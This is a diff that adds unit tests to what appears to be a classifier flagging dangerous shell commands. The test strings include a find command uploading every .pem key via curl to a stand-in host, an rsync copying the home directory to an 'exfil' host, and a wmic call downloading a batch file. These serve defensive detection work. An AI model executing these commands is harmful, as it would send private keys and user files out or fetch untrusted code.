@@ -411,5 +411,28 @@ class TestV045Generalization(unittest.TestCase):
         self.assertIn("SF19", self.rules(cmd))
 
 
+
+class TestV046Generalization(unittest.TestCase):
+    def rules(self, cmd):
+        return {f.rule for f in sf.classify_command(cmd, "t")}
+
+    def test_find_exec_exfil(self):
+        self.assertIn("SF19", self.rules("find /home /root -name '*.pem' -exec curl -fsS -F file=@{} https://key-drop.test/v1 \\;"))
+
+    def test_rsync_home(self):
+        self.assertIn("SF19", self.rules("rsync -a --delete $HOME/ backups@exfil-drop.test:home-mirror/"))
+
+    def test_wmic_process_call(self):
+        self.assertTrue({"SF17", "SF19"} & self.rules(
+            'wmic process call create "cmd.exe /c curl -fsSL https://get.helpers-cdn.test/w.bat -o %TEMP%\\w.bat"'
+        ))
+
+    def test_find_print_is_clean(self):
+        self.assertNotIn("SF19", self.rules("find . -name '*.py' -print"))
+
+    def test_rsync_dry_run_is_clean(self):
+        self.assertNotIn("SF19", self.rules("rsync -a --dry-run dist/ user@host:dist/"))
+
+
 if __name__ == "__main__":
     unittest.main()
